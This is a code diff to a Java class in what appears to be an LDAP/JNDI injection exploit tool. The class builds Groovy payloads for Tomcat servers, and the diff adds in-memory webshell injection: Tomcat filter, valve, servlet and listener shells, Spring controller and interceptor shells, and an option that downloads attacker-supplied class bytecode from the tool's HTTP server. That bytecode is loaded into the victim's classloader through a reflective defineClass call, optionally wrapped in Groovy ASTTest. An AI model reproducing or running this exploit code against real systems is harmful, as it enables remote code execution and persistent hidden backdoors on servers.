@@ -5,8 +5,11 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import javassist.ClassPool;
+import javassist.CtClass;
 import net.roboterh.injector.enums.PayloadEnum;
 import net.roboterh.injector.servers.HTTPServer;
+import net.roboterh.injector.templates.*;
 import net.roboterh.injector.utils.GadgetUtils;
 import net.roboterh.injector.utils.PayloadUtils;
 import org.apache.log4j.LogManager;
@@ -14,6 +17,7 @@ import org.apache.log4j.Logger;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
+import java.io.InputStream;
 import java.util.Arrays;
 
 /*
@@ -82,6 +86,7 @@ public class TomcatGroovy implements LDAPService{
 
         // add params
         switch (payload.name()) {
+            case "JavaFile":
             case "DnsLog":
                 String link = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                 params = new String[]{way, link};
@@ -117,6 +122,45 @@ public class TomcatGroovy implements LDAPService{
                     break;
                 case "File":
                     groovyScript = HttpUtil.get(HTTPServer.codeBase + params[0]);
+                    break;
+                case "TomcatEcho":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], TomcatEcho.class);
+                    break;
+                case "TomcatExecutor":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], TomcatExecutor.class);
+                    break;
+                case "TomcatFilter":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], TomcatFilter.class);
+                    break;
+                case "TomcatListener":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], TomcatListener.class);
+                    break;
+                case "TomcatServlet":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], TomcatServlet.class);
+                    break;
+                case "TomcatUpgrade":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], TomcatUpgrade.class);
+                    break;
+                case "TomcatValve":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], TomcatValve.class);
+                    break;
+                case "TomcatWebsocket":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], TomcatWebsocket.class);
+                    break;
+                case "SpringController":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], SpringController.class);
+                    break;
+                case "SpringEcho":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], SpringEcho.class);
+                    break;
+                case "SpringInterceptor":
+                    groovyScript = tomcatGroovyTemplate.getMemoryShell(params[0], SpringInterceptor.class);
+                    break;
+                case "JavaFile":
+                    InputStream inputStream = HttpUtil.createGet(HTTPServer.codeBase + params[1]).execute().bodyStream();
+                    ClassPool pool = ClassPool.getDefault();
+                    CtClass ctClass = pool.makeClass(inputStream);
+                    groovyScript = tomcatGroovyTemplate.getRemoteMemoryShell(params[0], PayloadUtils.base64Encode(ctClass.toBytecode()), ctClass.getName());
                     break;
             }
         } catch (Exception e) {
@@ -169,6 +213,21 @@ public class TomcatGroovy implements LDAPService{
                 "    }\n" +
                 "})\n" +
                 "def x";
+        private String ASTTestMemshellTemplate = "@groovy.transform.ASTTest(value = {\n" +
+                "{memshell}\n" +
+                "})\n" +
+                "def x";
+        private String MemshellCode = "def bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64(\"{classCode}\")\n" +
+                "def classLoader = Thread.currentThread().getContextClassLoader()\n" +
+                "\n" +
+                "try {\n" +
+                "    classLoader.loadClass(\"{className}\").newInstance()\n" +
+                "} catch (ClassNotFoundException e) {\n" +
+                "    def method = ClassLoader.class.getDeclaredMethod('defineClass', byte[].class, int.class, int.class)\n" +
+                "    method.setAccessible(true)\n" +
+                "    def clazz = method.invoke(classLoader, bytes, 0, bytes.length)\n" +
+                "    clazz.newInstance()\n" +
+                "}";
         public String getExecCode(String way, String cmd) {
             String finalPayload = "";
             switch (way) {
@@ -198,6 +257,42 @@ public class TomcatGroovy implements LDAPService{
         public String getGrabCode(String url) {
             String finalPayload = GrabTemplate.replace("{url}", url);
             return finalPayload;
+        }
+
+        public String getRemoteMemoryShell(String way, String classCode, String ClassName) {
+            String finalPayload = "";
+            switch (way) {
+                case "Normal":
+                    finalPayload = MemshellCode.replace("{classCode}", classCode).replace("{className}", ClassName);
+                    break;
+                case "ASTTest":
+                    finalPayload = ASTTestMemshellTemplate.replace("{memshell}", MemshellCode.replace("{classCode}", classCode).replace("{className}", ClassName));
+                    break;
+            }
+
+            return finalPayload;
+        }
+
+        // inject using classLoader
+        public String getMemoryShell(String way, Class clazz, String... args) {
+            String classCode = null;
+            try{
+//                获取base64后的类
+                classCode = PayloadUtils.getClassCode(clazz);
+
+            }catch(Exception e){
+                e.printStackTrace();
+            }
+            String code = "";
+            switch (way) {
+                case "Normal":
+                    code = MemshellCode.replace("{classCode}", classCode).replace("{className}", clazz.getName());
+                    break;
+                case "ASTTest":
+                    code = ASTTestMemshellTemplate.replace("{memshell}", MemshellCode.replace("{classCode}", classCode).replace("{className}", clazz.getName()));
+                    break;
+            }
+            return code;
         }
     }
 }
